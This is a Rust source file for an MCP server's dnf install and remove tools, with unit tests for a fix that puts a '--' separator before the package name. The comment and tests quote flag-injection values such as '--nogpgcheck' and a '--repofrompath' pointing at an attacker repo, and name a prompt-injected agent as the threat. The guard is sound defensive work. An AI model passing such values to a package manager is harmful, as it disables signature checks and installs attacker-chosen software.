use super::RedWrenchServer;
use rmcp::model::CallToolResult;
use rmcp::{handler::server::wrapper::Parameters, schemars, tool, tool_router};
use serde::Deserialize;

#[derive(Debug, Deserialize, schemars::JsonSchema)]
pub struct DnfPackageParams {
    /// The package name, e.g. "htop". Only a single package per call.
    pub package: String,
}

// NOTE (post-review fix, flag-injection guard): the executor never shells
// out (argv-only, confirmed in Task 3/6), so classic shell injection is
// closed. But dnf's own CLI parser recognizes flags anywhere in argv, not
// just in a fixed position, so a `package` value such as `--nogpgcheck` or
// `--repofrompath=evil,http://attacker/repo` would not merely fail to find
// a package, it would change dnf's actual behaviour (e.g. disabling GPG
// verification and pointing at an attacker-controlled repo, a real path to
// installing arbitrary attacker-chosen content). `package` is reachable by
// anything that controls the MCP tool call, including a prompt-injected
// agent, which is exactly this project's threat model.
//
// The fix is the standard GNU/argparse `--` separator, which dnf honours:
// everything after it is treated as a positional argument, never as an
// option, regardless of what it starts with. These two free functions build
// the argv vectors so the `--` placement can be unit-tested directly
// without needing a real `dnf` binary.
fn install_argv(package: String) -> Vec<String> {
    vec!["install".into(), "-y".into(), "--".into(), package]
}

fn remove_argv(package: String) -> Vec<String> {
    vec!["remove".into(), "-y".into(), "--".into(), package]
}

#[tool_router(router = dnf_router, vis = "pub(crate)")]
impl RedWrenchServer {
    #[tool(
        description = "Install a package via dnf. On immutable Fedora variants, \
        prefer rpm-ostree via run_command instead, dnf itself may not persist \
        changes across a reboot on those systems. Requires the 'standard' tier."
    )]
    pub async fn dnf_install(
        &self,
        Parameters(DnfPackageParams { package }): Parameters<DnfPackageParams>,
    ) -> CallToolResult {
        self.dispatch("dnf_install", "dnf", install_argv(package))
            .await
    }

    #[tool(description = "Remove a package via dnf. Requires the 'standard' tier.")]
    pub async fn dnf_remove(
        &self,
        Parameters(DnfPackageParams { package }): Parameters<DnfPackageParams>,
    ) -> CallToolResult {
        self.dispatch("dnf_remove", "dnf", remove_argv(package))
            .await
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn install_argv_places_a_literal_double_dash_separator_before_the_package() {
        let args = install_argv("--nogpgcheck".to_string());
        assert_eq!(args, vec!["install", "-y", "--", "--nogpgcheck"]);

        // The separator must be present regardless of position: assert its
        // index is immediately before the (last) package element, so a
        // flag-like package value can never be mistaken by dnf for an
        // option rather than a positional argument.
        let dash_pos = args
            .iter()
            .position(|a| a == "--")
            .expect("-- separator missing");
        assert_eq!(dash_pos, args.len() - 2);
        assert_eq!(args.last().unwrap(), "--nogpgcheck");
    }

    #[test]
    fn remove_argv_places_a_literal_double_dash_separator_before_the_package() {
        let args = remove_argv("--repofrompath=evil,http://attacker/repo".to_string());
        assert_eq!(
            args,
            vec![
                "remove",
                "-y",
                "--",
                "--repofrompath=evil,http://attacker/repo"
            ]
        );

        let dash_pos = args
            .iter()
            .position(|a| a == "--")
            .expect("-- separator missing");
        assert_eq!(dash_pos, args.len() - 2);
    }

    #[test]
    fn ordinary_package_names_are_unaffected() {
        assert_eq!(
            install_argv("htop".to_string()),
            vec!["install", "-y", "--", "htop"]
        );
        assert_eq!(
            remove_argv("htop".to_string()),
            vec!["remove", "-y", "--", "htop"]
        );
    }
}
